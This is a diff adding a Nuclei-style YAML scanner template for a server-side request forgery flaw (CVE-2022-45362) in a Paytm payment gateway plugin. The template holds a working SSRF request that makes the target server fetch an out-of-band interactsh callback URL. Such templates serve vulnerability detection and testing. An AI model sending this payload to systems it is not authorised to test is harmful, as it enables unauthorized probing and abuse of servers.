@@ -1,0 +1,31 @@
+id: poc-yaml-paytm-payment-gateway-ssrf
+info:
+  name: Paytm Payment SSRF (CVE-2022-45362)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog,cve,cve-2022-45362
+  description: |
+    Paytm Payment Gateway is vulnerable to a server-side request forgery (SSRF) vulnerability. This vulnerability allows attackers to execute unauthorized requests via crafted URLs.
+
+variables:
+  reverse_dns: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /?paytm_action=curltest&url={{reverse_dns}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "paytm-payments.css"
+        part: body
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
